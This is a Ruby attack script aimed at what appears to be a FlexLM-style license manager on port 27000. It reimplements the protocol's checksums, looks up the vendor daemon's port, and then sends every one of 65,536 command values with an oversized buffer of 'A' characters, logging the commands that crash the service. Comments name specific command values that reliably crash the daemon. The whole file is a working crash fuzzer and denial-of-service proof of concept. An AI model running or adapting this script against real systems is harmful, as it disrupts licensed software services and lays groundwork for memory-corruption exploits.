#!/usr/bin/ruby

require 'socket'

host ='192.168.1.221'
port = 27000

  def header_checksum(packet,header_len = 20)
    packet_bytes = packet.unpack("C*")
    checksum = packet_bytes[0]
    i = 2
    while i < header_len
      checksum = checksum + packet_bytes[i]
      i = i + 1
    end
    return (checksum & 0x0FF)
  end

  def data_checksum(packet_data)
    word_table = ""
    i = 0
    while i < 256
      v4 = 0
      v3 = i
      j = 8

      while j > 0
        if ((v4 ^ v3) & 1) == 1
          v4 = ((v4 >> 1) ^ 0x3A5D) & 0x0FFFF
        else
          v4 = (v4 >> 1) & 0x0FFFF
        end
        v3 >>= 1
        j = j - 1
      end

      word_table << [v4].pack("S")
      i = i + 1
    end
    k = 0
    checksum = 0
    data_bytes = packet_data.unpack("C*")
    word_table_words = word_table.unpack("S*")
    while k < packet_data.length
      position = data_bytes[k] ^ (checksum & 0x0FF)
      checksum = (word_table_words[position] ^ (checksum >> 8)) & 0x0FFFF
      k = k + 1
    end
    return checksum
  end

  def get_LM_port(host,port)
	resp=""
	s = TCPSocket.open(host,port)

	username = "USERNAME"
	computername = "COMPUTERNAME" 
	pkt = "\x68"
	pkt << "\x00" # header checksum
	pkt << "\x31\x33" # pkt length
	pkt << username + "\x00"*(20 - username.length + 1 )
	pkt << computername + "\x00"*(32 - computername.length + 1 )
	pkt << "demo" + "\x00"*7
	pkt << computername + "\x00"*(32 - computername.length + 1 )
	pkt << "\x54"
	pkt << "\x00"*12
	pkt << "\x32\x34\x34\x80" + "\x00"*7
	pkt << "i86_n3" + "\x00"*7
	pkt << "\x0b\x0c\x37\x38\x00\x31\x34\x00"


	#pkt[2,2] = [pkt.length].pack("n")
    	hdr_sum = header_checksum(pkt,pkt.length)
    	pkt[1] = [hdr_sum].pack("C")
	s.puts(pkt)
	resp = s.recv(1024)
	s.close
	if resp.nil?
		return nil
	end
	lmport = resp[-9,2].unpack('n')[0] #nasty code to get the integer of the port
	return lmport
	
  end

  def create_packet(seq_num,data, command)
    pkt = "\x2f"  #possible command, might try to fuzz this
#    pkt = "\x3a"
    pkt << "\x00" # header checksum
    pkt << "\x00\x00" # data checksum
    pkt << "\x00\x00" # pkt length

    pkt << [command].pack("n") # I think this is a command, to crash things
    #pkt << "\x01\x42" This will crash it as well
    
    pkt << [seq_num].pack("N")
    pkt << "\x00\x00\x00\x00\x00\x00\x00\x00" # Padding to finish the header
    pkt << data
    pkt << "\x00" #add null terminator

    pkt[4,2] = [pkt.length].pack("n")

    data_sum = data_checksum(pkt[4, pkt.length - 4])
    pkt[2, 2] = [data_sum].pack("n")

    hdr_sum = header_checksum(pkt[0, 20])
    pkt[1] = [hdr_sum].pack("C")
    return pkt
  end

seq_num = rand(16843009..4294967295) #get random number in range from \x01010101 to \xFFFFFFFF. Could try fuzzing this possibly in the future

data="A"*15000#+"\x00"*16  THIS WILL CRASH with command \x01\x44
#data="\x00"*16
#prev_lmport =0
i=0
while i< 65536
	pkt = create_packet(seq_num,data,i)
	lmport= get_LM_port(host,port)
	#puts "[+] Daemon is running on #{lmport}"
#	if prev_lmport != lmport
#		puts "[+][+][+] Command #{i-1} crashed Daemon"
#	end
	sock = TCPSocket.open(host,lmport)
	#puts "Trying command of integer value #{i}"
	begin
		sock.puts(pkt)
		response = sock.gets
		if response != nil
			puts "Command #{i.to_s(16)} responded with: #{response}"
		end
		sock.close
	rescue
		puts "[+] Crash on command #{i.to_s(16)}"
		sleep 4
	ensure
		i += 1	
	end
#	prev_lmport = lmport
end
puts "DONE DONE DONE"
